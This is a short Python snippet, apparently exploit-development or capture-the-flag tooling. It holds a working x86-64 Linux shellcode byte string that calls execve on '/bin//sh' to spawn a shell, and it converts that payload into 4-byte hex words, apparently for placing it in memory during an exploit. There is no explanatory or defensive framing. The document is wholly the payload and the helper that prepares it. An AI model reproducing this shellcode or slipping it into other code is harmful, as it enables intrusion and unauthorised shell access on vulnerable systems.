shell_code = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

print(len(shell_code))

for i in range(0,len(shell_code), 4):
    tmp_shell="0x"
    k = i+4
    if(i == 28):
        break
    for j in range(i,k,1):
        tmp_shell += str("{0:x}".format(shell_code[j]))
    print(tmp_shell)


tmp_shell += str("{0:x}".format(shell_code[28])) + str(0)
tmp_shell += str("{0:x}".format(shell_code[29])) + str(0)
tmp_shell += str("{0:x}".format(shell_code[30]))
tmp_shell += "00"

print(tmp_shell)